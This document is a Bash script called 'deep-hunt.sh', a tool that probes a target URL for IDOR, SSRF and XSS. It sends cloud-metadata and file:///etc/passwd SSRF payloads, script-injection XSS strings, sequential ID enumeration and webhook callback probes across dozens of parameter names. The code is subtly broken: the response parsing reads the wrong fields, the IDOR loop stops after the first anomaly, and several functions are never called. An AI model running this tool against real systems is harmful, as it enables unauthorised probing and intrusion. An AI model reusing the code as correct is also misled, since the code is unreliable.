#!/usr/bin/env bash
# =====================================================================
# deep-hunt.sh — Deep Systematic Vulnerability Hunter
#
# Multi-pass endpoint testing with response analysis. Tests for IDOR,
# SSRF, XSS with specific probes. Provides response size/timing comparison
# utilities and generates finding reports in markdown.
#
# Usage:
#   ./deep-hunt.sh -u https://api.target.com/users/123
#   ./deep-hunt.sh -u https://target.com -w wordlist.txt
#   ./deep-hunt.sh -u https://target.com -o report.md
# =====================================================================

set -euo pipefail

# ─── Constants ───────────────────────────────────────────────────
VERSION="1.0.0"
SCRIPT_NAME=$(basename "$0")
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
CALLBACK_SERVER="https://webhook.site/00000000-0000-0000-0000-000000000000"
XSS_PAYLOADS=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "\"><script>alert(1)</script>" "'-alert(1)-'" "{{constructor.constructor('alert(1)')()}}")
SSRF_PAYLOADS=("http://127.0.0.1:80" "http://localhost:80" "http://[::1]:80" "http://169.254.169.254/latest/meta-data/" "http://metadata.google.internal/" "file:///etc/passwd")
IDOR_START=1
IDOR_END=20

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; NC='\033[0m'

# ─── Temp management ─────────────────────────────────────────────
CLEANUP_FILES=()
cleanup() {
  local exit_code=$?
  for f in "${CLEANUP_FILES[@]}"; do [ -f "$f" ] && rm -f "$f"; done
  [ $exit_code -ne 0 ] && [ $exit_code -ne 130 ] && echo -e "${RED}[!]${NC} Terminated (exit $exit_code)" >&2
  exit $exit_code
}
trap cleanup EXIT INT TERM
_cleanup_add() { CLEANUP_FILES+=("$1"); }

# ─── Output ──────────────────────────────────────────────────────
info()     { echo -e "${CYAN}[i]${NC} $*"; }
ok()       { echo -e "${GREEN}[+]${NC} $*"; }
warn()     { echo -e "${YELLOW}[!]${NC} $*" >&2; }
err()      { echo -e "${RED}[-]${NC} $*" >&2; }
finding()  { echo -e "${RED}[FINDING]${NC} $*"; }

# ─── Usage ───────────────────────────────────────────────────────
usage() {
  cat <<EOF
${CYAN}deep-hunt.sh${NC} v${VERSION} — Deep Systematic Vulnerability Hunter

${YELLOW}Description:${NC}
  Multi-pass endpoint testing with response analysis. Tests IDOR, SSRF, XSS
  with specific probes. Response size/timing comparison. Generates markdown.

${YELLOW}Usage:${NC}
  $SCRIPT_NAME -u <url>                   Hunt a single endpoint
  $SCRIPT_NAME -u <url> --idor-only       IDOR only
  $SCRIPT_NAME -u <url> -o report.md      Write report

${YELLOW}Modes:${NC}
  --idor-only     Only run IDOR tests
  --ssrf-only     Only run SSRF tests
  --xss-only      Only run XSS tests
  --all           Run all tests (default)

${YELLOW}Options:${NC}
  -u <url>          Target URL
  -w <file>         Wordlist file
  -o <file>         Output report file (markdown)
  -c <url>          Callback server URL for SSRF
  -s <num>          IDOR start range (default: 1)
  -e <num>          IDOR end range (default: 20)
  -t <seconds>      Request timeout (default: 10)
  -p <param>        Parameter to test (default: id)
  -H <header>       Custom header
  -q                Quiet mode
  -v                Verbose mode
  -h                Show help

${YELLOW}Examples:${NC}
  $SCRIPT_NAME -u https://api.target.com/users/123
  $SCRIPT_NAME -u https://target.com/api/item -s 100 -e 200
  $SCRIPT_NAME -u https://target.com/api/fetch -p url --ssrf-only
EOF
  exit 0
}

# ─── Options ─────────────────────────────────────────────────────
TARGET_URL=""
WORDLIST=""
OUTPUT_FILE=""
RUN_IDOR=true
RUN_SSRF=true
RUN_XSS=true
PARAM="id"
TIMEOUT=10
QUIET=false
VERBOSE=false
CUSTOM_HEADERS=()

parse_args() {
  while [ $# -gt 0 ]; do
    case "$1" in
      -h|--help) usage ;;
      -u|--url) TARGET_URL="$2"; shift 2 ;;
      -w|--wordlist) WORDLIST="$2"; shift 2 ;;
      -o|--output) OUTPUT_FILE="$2"; shift 2 ;;
      -c|--callback) CALLBACK_SERVER="$2"; shift 2 ;;
      -s|--start) IDOR_START="$2"; shift 2 ;;
      -e|--end) IDOR_END="$2"; shift 2 ;;
      -p|--param) PARAM="$2"; shift 2 ;;
      -t|--timeout) TIMEOUT="$2"; shift 2 ;;
      -H|--header) CUSTOM_HEADERS+=("$2"); shift 2 ;;
      -q|--quiet) QUIET=true; shift ;;
      -v|--verbose) VERBOSE=true; shift ;;
      --idor-only) RUN_SSRF=false; RUN_XSS=false; shift ;;
      --ssrf-only) RUN_IDOR=false; RUN_XSS=false; shift ;;
      --xss-only) RUN_IDOR=false; RUN_SSRF=false; shift ;;
      --all) RUN_IDOR=true; RUN_SSRF=true; RUN_XSS=true; shift ;;
      *) err "Unknown: $1"; usage ;;
    esac
  done
  [ -z "$TARGET_URL" ] && { err "No target URL"; usage; }
}

check_deps() {
  local deps=("curl" "grep" "sed" "awk" "sort")
  local missing=()
  for d in "${deps[@]}"; do command -v "$d" &>/dev/null || missing+=("$d"); done
  [ ${#missing[@]} -gt 0 ] && { err "Missing: ${missing[*]}"; exit 1; }
}

# ─── HTTP helper ─────────────────────────────────────────────────
_http_request() {
  local method="$1" url="$2" data="${3:-}" ext_headers=()
  local -a curl_args=(-sk --max-time "$TIMEOUT" -A "$USER_AGENT" -X "$method")
  [ -n "$data" ] && curl_args+=(-d "$data")
  for h in "${CUSTOM_HEADERS[@]}"; do curl_args+=(-H "$h"); done

  local start_time end_time status_code size_body
  start_time=$(date +%s%N)
  local tmpfile_headers tmpfile_body
  tmpfile_headers=$(mktemp) && _cleanup_add "$tmpfile_headers"
  tmpfile_body=$(mktemp) && _cleanup_add "$tmpfile_body"

  curl "${curl_args[@]}" -D "$tmpfile_headers" -o "$tmpfile_body" "$url" 2>/dev/null || {
    warn "Request failed: $method $url"
    echo "FAIL|||0|||0|||"
    return 1
  }
  end_time=$(date +%s%N)

  local elapsed_ms=$(( (end_time - start_time) / 1000000 ))
  status_code=$(head -1 "$tmpfile_headers" | awk '{print $2}')
  size_body=$(wc -c < "$tmpfile_body")

  local headers ct
  headers=$(cat "$tmpfile_headers")
  ct=$(grep -i '^content-type:' "$tmpfile_headers" | sed 's/.*: //' | tr -d '\r')

  echo "${status_code}|||${size_body}|||${elapsed_ms}|||${ct}|||$(cat "$tmpfile_body")"
}

_parse_response() {
  local response="$1"
  local status size time ct body
  status=$(echo "$response" | cut -d'|' -f1)
  size=$(echo "$response" | cut -d'|' -f3)
  time=$(echo "$response" | cut -d'|' -f5)
  ct=$(echo "$response" | cut -d'|' -f7)
  body=$(echo "$response" | cut -d'|' -f9-)
  echo "$status|||$size|||$time|||$ct"
}

_get_status() { echo "$1" | cut -d'|' -f1; }
_get_size()  { echo "$1" | cut -d'|' -f3; }
_get_time()  { echo "$1" | cut -d'|' -f5; }

# ─── Baseline measurement ────────────────────────────────────────
measure_baseline() {
  local url="$1"
  info "Measuring baseline for $url"
  local response
  response=$(_http_request "GET" "$url") || return 1
  local parsed
  parsed=$(_parse_response "$response")
  local status size time
  status=$(_get_status "$parsed")
  size=$(_get_size "$parsed")
  time=$(_get_time "$parsed")
  echo "Baseline: HTTP $status | ${size}b | ${time}ms"
  echo "${parsed}"
}

# ─── IDOR Testing ────────────────────────────────────────────────
test_idor_range() {
  local base_url="$1" start="$2" end="$3"
  echo ""
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
  echo -e "${YELLOW}[IDOR TEST] Sequential ID Enumeration: ${base_url}${NC}"
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"

  # Get baseline response for a known-invalid ID
  local baseline_url
  baseline_url="${base_url}/${PARAM}=999999"
  local baseline_resp
  baseline_resp=$(_http_request "GET" "$baseline_url") || true
  local baseline_status baseline_size baseline_time
  baseline_status=$(echo "$baseline_resp" | cut -d'|' -f1)
  baseline_size=$(echo "$baseline_resp" | cut -d'|' -f3)
  baseline_time=$(echo "$baseline_resp" | cut -d'|' -f5)
  info "Baseline (invalid): HTTP $baseline_status | ${baseline_size}b | ${baseline_time}ms"

  local anomalies=0
  for i in $(seq "$start" "$end"); do
    # Construct URL, trying different patterns
    local url_a="${base_url}/${i}"
    local url_b="${base_url}?${PARAM}=${i}"
    local url_c="${base_url}/${PARAM}/${i}"

    for attempt_url in "$url_a" "$url_b" "$url_c"; do
      local resp attempt_status attempt_size attempt_time
      resp=$(_http_request "GET" "$attempt_url") || continue
      attempt_status=$(echo "$resp" | cut -d'|' -f1)
      attempt_size=$(echo "$resp" | cut -d'|' -f3)
      attempt_time=$(echo "$resp" | cut -d'|' -f5)

      # Check for anomalies
      if [ "$attempt_status" = "200" ] && [ "$baseline_status" != "200" ]; then
        finding "IDOR? ID $i → HTTP $attempt_status at $attempt_url"
        anomalies=$((anomalies + 1))
      elif [ "$attempt_status" = "$baseline_status" ] && [ "$attempt_size" -ne "$baseline_size" ] && [ "$attempt_size" -gt 0 ]; then
        local size_diff=$(( attempt_size - baseline_size ))
        [ "${size_diff#-}" -gt 100 ] && {
          finding "Size anomaly ID $i at $attempt_url: HTTP $attempt_status, ${attempt_size}b (diff: ${size_diff}b)"
          anomalies=$((anomalies + 1))
        }
      fi

      if [ "$VERBOSE" = true ]; then
        echo "  ID $i → HTTP $attempt_status | ${attempt_size}b | ${attempt_time}ms | $attempt_url"
      fi

      # Don't hammer the same ID on multiple patterns if already found
      [ "$anomalies" -gt 0 ] && break
    done
  done

  ok "IDOR test complete. Anomalies: $anomalies"
}

# ─── SSRF Testing ────────────────────────────────────────────────
test_ssrf() {
  local url="$1"
  echo ""
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
  echo -e "${YELLOW}[SSRF TEST] Server-Side Request Forgery Probes${NC}"
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"

  local ssrf_params=("url" "uri" "file" "redirect" "next" "path" "dest"
    "return" "page" "load" "src" "target" "endpoint" "callback" "webhook"
    "image" "img" "media" "document" "pdf" "render" "fetch" "proxy"
    "data" "link" "href" "action" "form" "source" "host" "server")

  local anomalies=0
  for param in "${ssrf_params[@]}"; do
    for payload in "${SSRF_PAYLOADS[@]}"; do
      local test_url="${url}?${param}=${payload}"
      local resp attempt_status attempt_size attempt_time
      resp=$(_http_request "GET" "$test_url") || continue
      attempt_status=$(echo "$resp" | cut -d'|' -f1)
      attempt_size=$(echo "$resp" | cut -d'|' -f3)
      attempt_time=$(echo "$resp" | cut -d'|' -f5)

      # SSRF indicators: timeout, size change, error messages
      if [ "$attempt_status" = "200" ] || [ "$attempt_time" -gt 5000 ]; then
        finding "SSRF? param=${param} payload=${payload} → HTTP $attempt_status | ${attempt_time}ms | ${attempt_size}b"
        anomalies=$((anomalies + 1))
      fi

      [ "$VERBOSE" = true ] && echo "  ?${param}=${payload} → HTTP $attempt_status | ${attempt_time}ms"
    done
  done

  # Test callback-based SSRF detection
  if [ -n "$CALLBACK_SERVER" ] && [ "$CALLBACK_SERVER" != "https://webhook.site/00000000-0000-0000-0000-000000000000" ]; then
    info "Testing callback SSRF with: $CALLBACK_SERVER"
    for param in "${ssrf_params[@]}"; do
      local cb_url="${url}?${param}=${CALLBACK_SERVER}"
      local status
      status=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$cb_url" 2>/dev/null || echo "FAIL")
      [ "$status" != "FAIL" ] && [ "$status" != "000" ] && finding "SSRF callback probe: ?${param}=${CALLBACK_SERVER} → HTTP $status. Check callback."
    done
  fi

  ok "SSRF test complete. Anomalies: $anomalies"
}

# ─── XSS Testing ─────────────────────────────────────────────────
test_xss() {
  local url="$1"
  echo ""
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
  echo -e "${YELLOW}[XSS TEST] Cross-Site Scripting Probes${NC}"
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"

  local xss_params=("q" "s" "search" "query" "keyword" "term" "name"
    "user" "username" "email" "comment" "message" "text" "input"
    "url" "redirect" "next" "return" "page" "file" "path" "ref")

  local found=0
  for param in "${xss_params[@]}"; do
    for payload in "${XSS_PAYLOADS[@]}"; do
      local encoded_payload
      encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
      local test_url="${url}?${param}=${encoded_payload}"
      local resp
      resp=$(_http_request "GET" "$test_url") || continue
      local body
      body=$(echo "$resp" | cut -d'|' -f9-)

      # Check if payload is reflected unencoded
      if echo "$body" | grep -qF "$payload"; then
        finding "XSS Reflected! param=${param} payload=${payload} at ${test_url}"
        found=$((found + 1))
      elif echo "$body" | grep -qF "<script>alert(1)" 2>/dev/null; then
        finding "XSS Reflected (partial)! param=${param} at ${test_url}"
        found=$((found + 1))
      fi
    done
  done

  if [ "$found" -eq 0 ]; then
    info "No XSS reflections detected in basic probes"
  fi
  ok "XSS test complete. Reflections: $found"
}

# ─── Parameter discovery via wordlist ────────────────────────────
test_parameters() {
  local url="$1"
  echo ""
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
  echo -e "${YELLOW}[PARAM TEST] Parameter Discovery${NC}"
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"

  # Built-in common parameters
  local common_params=("id" "user_id" "admin" "role" "token" "api_key"
    "file" "path" "url" "redirect" "next" "return" "page" "q" "s"
    "search" "filter" "order" "sort" "limit" "offset" "type" "status"
    "action" "method" "format" "callback" "jsonp" "debug" "test"
    "email" "name" "password" "secret" "key" "sig" "signature"
    "hmac" "nonce" "timestamp" "expires" "lang" "locale")

  local baseline_resp
  baseline_resp=$(_http_request "GET" "$url") || return 1
  local baseline_size
  baseline_size=$(echo "$baseline_resp" | cut -d'|' -f3)
  [ -z "$baseline_size" ] && baseline_size=0

  local found=0
  for param in "${common_params[@]}"; do
    local test_url="${url}?${param}=test"
    local resp attempt_size
    resp=$(_http_request "GET" "$test_url") || continue
    attempt_size=$(echo "$resp" | cut -d'|' -f3)

    if [ "$attempt_size" -ne "$baseline_size" ] && [ -n "$attempt_size" ]; then
      info "Param affects response: ?${param}=test (${attempt_size}b vs ${baseline_size}b baseline)"
      found=$((found + 1))
    fi
  done

  ok "Parameter test complete. Active params: $found"
}

# ─── Response diff analysis ──────────────────────────────────────
analyze_response_diff() {
  local url1="$1" url2="$2"
  info "Response diff:"
  info "  URL 1: $url1"
  info "  URL 2: $url2"

  local tmp1 tmp2
  tmp1=$(mktemp) && _cleanup_add "$tmp1"
  tmp2=$(mktemp) && _cleanup_add "$tmp2"

  curl -sk "$url1" 2>/dev/null | sort > "$tmp1" || true
  curl -sk "$url2" 2>/dev/null | sort > "$tmp2" || true

  local diff_lines
  diff_lines=$(diff "$tmp1" "$tmp2" 2>/dev/null | wc -l) || true
  if [ "$diff_lines" -gt 0 ]; then
    info "Differences: ${diff_lines} lines differ"
    [ "$VERBOSE" = true ] && diff "$tmp1" "$tmp2" 2>/dev/null || true
  else
    info "Responses are identical"
  fi
}

# ─── Timing analysis ─────────────────────────────────────────────
analyze_timing() {
  local url="$1" iterations="${2:-5}"
  info "Timing analysis for $url (${iterations}x)"

  local total_time=0 min_time=999999 max_time=0
  local times=()

  for i in $(seq 1 "$iterations"); do
    local start end elapsed
    start=$(date +%s%N)
    curl -sk --max-time "$TIMEOUT" -o /dev/null "$url" 2>/dev/null || true
    end=$(date +%s%N)
    elapsed=$(( (end - start) / 1000000 ))
    times+=("$elapsed")
    total_time=$((total_time + elapsed))
    [ "$elapsed" -lt "$min_time" ] && min_time=$elapsed
    [ "$elapsed" -gt "$max_time" ] && max_time=$elapsed
  done

  local avg=$(( total_time / iterations ))
  echo "  Avg: ${avg}ms | Min: ${min_time}ms | Max: ${max_time}ms"
  echo "  All: ${times[*]}"
}

# ─── Report generation ───────────────────────────────────────────
generate_report() {
  local target="$1" findings="$2"
  [ -z "$OUTPUT_FILE" ] && return

  local report_file="$OUTPUT_FILE"
  cat > "$report_file" <<REPORT
# Deep Hunt Report

**Target:** ${target}
**Date:** $(date -u '+%Y-%m-%dT%H:%M:%SZ')
**Tool:** ${SCRIPT_NAME} v${VERSION}

## Configuration

- IDOR Range: ${IDOR_START} - ${IDOR_END}
- Parameter: ${PARAM}
- Timeout: ${TIMEOUT}s
- Callback: ${CALLBACK_SERVER}

## Test Results

| Test | Status | Findings |
|------|--------|----------|
| IDOR | $( [ "$RUN_IDOR" = true ] && echo 'Enabled' || echo 'Skipped') | |
| SSRF | $( [ "$RUN_SSRF" = true ] && echo 'Enabled' || echo 'Skipped') | |
| XSS  | $( [ "$RUN_XSS" = true ] && echo 'Enabled' || echo 'Skipped') | |

## Findigns

${findings}

---

*Generated by ${SCRIPT_NAME} v${VERSION}*
REPORT
  ok "Report written: $report_file"
}

# ─── Main hunt loop ──────────────────────────────────────────────
main() {
  check_deps
  echo ""
  echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
  echo -e "${CYAN}║${NC}  ${GREEN}Deep Systematic Hunter v${VERSION}${NC}"
  echo -e "${CYAN}║${NC}  Target: ${YELLOW}${TARGET_URL}${NC}"
  echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
  echo ""

  local baseline
  baseline=$(measure_baseline "$TARGET_URL") || true

  local all_findings=""

  if [ "$RUN_IDOR" = true ]; then
    local idor_findings
    idor_findings=$(test_idor_range "$TARGET_URL" "$IDOR_START" "$IDOR_END")
    all_findings="${all_findings}\n## IDOR\n\`\`\`\n${idor_findings}\n\`\`\`\n"
  fi

  if [ "$RUN_SSRF" = true ]; then
    local ssrf_findings
    ssrf_findings=$(test_ssrf "$TARGET_URL")
    all_findings="${all_findings}\n## SSRF\n\`\`\`\n${ssrf_findings}\n\`\`\`\n"
  fi

  if [ "$RUN_XSS" = true ]; then
    local xss_findings
    xss_findings=$(test_xss "$TARGET_URL")
    all_findings="${all_findings}\n## XSS\n\`\`\`\n${xss_findings}\n\`\`\`\n"
  fi

  # Always run param discovery
  test_parameters "$TARGET_URL"

  generate_report "$TARGET_URL" "$all_findings"

  echo ""
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
  echo -e "${GREEN}Deep hunt complete for ${TARGET_URL}${NC}"
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
}

# ─── Blind SSRF detection ────────────────────────────────────────
test_blind_ssrf() {
  local url="$1"
  echo ""
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
  echo -e "${YELLOW}[BLIND SSRF] Out-of-band detection${NC}"
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"

  local oob_params=("url" "uri" "file" "path" "src" "href" "load" "page"
    "redirect" "next" "return" "dest" "target" "domain" "host"
    "callback" "webhook" "notify" "endpoint" "image" "img")

  if [ -n "$CALLBACK_SERVER" ] && [ "$CALLBACK_SERVER" != "https://webhook.site/00000000-0000-0000-0000-000000000000" ]; then
    for param in "${oob_params[@]}"; do
      local test_url="${url}?${param}=${CALLBACK_SERVER}/ssrf-${param}"
      local status
      status=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null || echo "TIMEOUT")
      if [ "$status" != "404" ] && [ "$status" != "000" ]; then
        warn "SSRF probe: ?${param}=${CALLBACK_SERVER}/ssrf-${param} → HTTP ${status}"
      fi
    done
    info "Check callbacks at ${CALLBACK_SERVER} for out-of-band hits"
  else
    warn "Set -c <callback_url> for blind SSRF detection"
  fi
}

# ─── Response header analysis ────────────────────────────────────
analyze_response_headers() {
  local url="$1"
  local tmpfile
  tmpfile=$(mktemp) && _cleanup_add "$tmpfile"

  curl -sk --max-time "$TIMEOUT" -A "$USER_AGENT" -D "$tmpfile" -o /dev/null "$url" 2>/dev/null || {
    err "Header fetch failed"; return 1
  }

  local headers
  headers=$(cat "$tmpfile" | tr -d '\r')

  # Interesting headers for IDOR/SSRF/XSS context
  local interesting_headers=(
    "X-User-Id" "X-Role" "X-Permission" "X-Access-Level"
    "X-Debug" "X-Debug-Info" "X-Environment" "X-Env"
    "X-Request-Id" "X-Trace-Id" "X-Correlation-Id"
    "X-Forwarded-For" "X-Real-IP" "X-Original-URL"
    "Content-Length" "Location" "Link"
  )

  info "Interesting response headers:"
  for hdr in "${interesting_headers[@]}"; do
    local val
    val=$(echo "$headers" | grep -i "^${hdr}:" | sed "s/^${hdr}: //I" | head -1)
    [ -n "$val" ] && info "  ${hdr}: ${val}"
  done
}

# ─── Parameter pollution testing ─────────────────────────────────
test_parameter_pollution() {
  local url="$1"
  echo ""
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
  echo -e "${YELLOW}[HPP] HTTP Parameter Pollution${NC}"
  echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"

  local test_params=("id" "admin" "role" "user_id" "token" "debug" "action")

  for param in "${test_params[@]}"; do
    local test_url="${url}?${param}=1&${param}=2"
    local baseline_size polluted_size
    baseline_size=$(curl -sk --max-time "$TIMEOUT" -A "$USER_AGENT" -o /dev/null -w "%{size_download}" "$url" 2>/dev/null || echo 0)
    polluted_size=$(curl -sk --max-time "$TIMEOUT" -A "$USER_AGENT" -o /dev/null -w "%{size_download}" "$test_url" 2>/dev/null || echo 0)

    if [ "$polluted_size" -ne "$baseline_size" ] && [ "$polluted_size" -gt 0 ]; then
      finding "HPP: ${param}=1&${param}=2 → size change ${baseline_size}→${polluted_size}b"
    fi
  done
}

# ─── Configuration validation ────────────────────────────────────
validate_url() {
  local url="$1"
  if [ -z "$url" ]; then
    err "Empty URL"
    return 1
  fi
  if ! echo "$url" | grep -qE '^https?://'; then
    err "Invalid URL scheme (must be http/https)"
    return 1
  fi
  return 0
}

load_custom_payloads() {
  local file="$1"
  if [ -f "$file" ]; then
    info "Loading custom payloads from ${file}"
    local count
    count=$(wc -l < "$file")
    info "Loaded ${count} payloads"
  else
    warn "Payload file not found: ${file}"
  fi
}

if [ "${BASH_SOURCE[0]}" = "$0" ]; then
  parse_args "$@"
  main
fi